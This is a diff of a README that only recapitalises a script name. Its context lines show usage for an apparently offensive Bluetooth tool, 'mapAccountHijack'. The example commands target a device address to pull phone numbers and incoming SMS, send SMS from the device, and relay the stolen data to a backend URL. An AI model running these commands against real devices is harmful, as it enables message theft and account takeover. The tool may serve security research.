@@ -86,11 +86,11 @@ source ${tool_installation_path}/.venv/bin/activate
 Run the following command to display the help information:
 
 ```sh
-python3 mapAccounthijack.py --help
+python3 mapAccountHijack.py --help
 ```
 
 ```console
-usage: mapAccounthijack.py [-h] --address ADDRESS --dest-dir DEST_DIR [--phone-number PHONE_NUMBER] [--sms-content SMS_CONTENT] [--backend BACKEND]
+usage: mapAccountHijack.py [-h] --address ADDRESS --dest-dir DEST_DIR [--phone-number PHONE_NUMBER] [--sms-content SMS_CONTENT] [--backend BACKEND]
 
 Map Account Hijack
 
@@ -109,15 +109,15 @@ options:
 
 1. The following command will connect to AA:BB:CC:DD:EE:FF and try to exploit it without relaying newly arrived SMS messages and phone numbers it was able to retrieve. It won't send an SMS message to another device
 ```sh
-python3 mapAccounthijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out
+python3 mapAccountHijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out
 ```
 2. Connect to AA:BB:CC:DD:EE:FF and try to send an SMS message to the phone number +1234567890
 ```sh
-python3 mapAccounthijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out --phone-number +1234567890
+python3 mapAccountHijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out --phone-number +1234567890
 ```
 3. Connect to AA:BB:CC:DD:EE:FF and relay all the leaked phone numbers and newly arrived SMS messages to a backend url (Will receive POST requests with JSON data: content - data, type - type of the data relayed)
 ```sh
-python3 mapAccounthijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out --backend http://127.0.0.1:8080/
+python3 mapAccountHijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out --backend http://127.0.0.1:8080/
 ```
 
 ## A few facts and tricks
